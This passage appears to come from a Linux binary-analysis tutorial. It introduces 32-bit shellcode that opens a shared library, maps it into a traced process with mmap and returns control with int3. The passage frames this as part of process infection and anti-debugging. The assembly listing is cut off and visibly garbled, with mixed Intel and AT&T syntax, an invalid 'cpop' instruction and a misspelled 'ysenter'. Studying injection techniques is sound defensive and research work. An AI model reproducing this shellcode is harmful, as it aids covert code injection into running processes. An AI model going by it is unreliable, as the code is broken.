    \ performing the infection, or even more disturbing, the ability to trigger some\
    \ type of anti-debugging mechanism within malware or a binary processor.\n\nThe\
    \ following 32-bit code memory maps a shared library into a process and then passes\
    \ control back to the tracer with int3. Notice that int 0x80 is being used to\
    \ invoke the syscalls. This shellcode is actually quite old; I wrote it in 2008.\
    \ Typically, nowadays we want to use the ysenter or syscall instruction to invoke\
    \ a system call in Linux, but the int 0x80 will still work; it is just slower\
    \ and therefore deprecated:\n\n```\n:start:\n    jmp B\n\nA:\n    # fd = open(\"\
    libtest.so.1.0\", O_RDONLY);\n\n    xor ecx, %ecx\nmov $5, %al\ncpop %ebx\nxor\
    \ ecx, %ecx\n    int $0x80\n\n    subl $24, %esp\n\n    # mmap(0, 8192, PROT_READ|PROT_WRITE|PROT_EXEC,\
